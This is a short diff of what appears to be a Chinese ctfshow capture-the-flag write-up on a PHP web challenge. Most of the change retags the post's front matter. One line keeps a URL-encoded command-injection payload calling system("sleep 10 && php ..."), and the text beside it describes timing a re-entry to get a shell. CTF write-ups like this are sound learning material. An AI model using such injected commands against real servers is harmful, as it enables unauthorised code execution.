@@ -6,8 +6,8 @@ date: "2024-09-06T13:56:39"
 lastmod: "2024-09-06T13:56:39"
 image: ""
 license: ""
-categories: ["ctfshow"]
-tags: ["php"]
+categories: ["赛题"]
+tags: ["ctfshow", "PHP"]
 ---
 # web签到
 
@@ -170,4 +170,3 @@ cmd=%73%79%73%74%65%6d%28%22%73%6c%65%65%70%20%31%30%20%26%26%20%70%68%70%20%2d%
 ```
 
 然后10s中之内check一下，马上退出来，在重新进入就可以`getshell`了
-
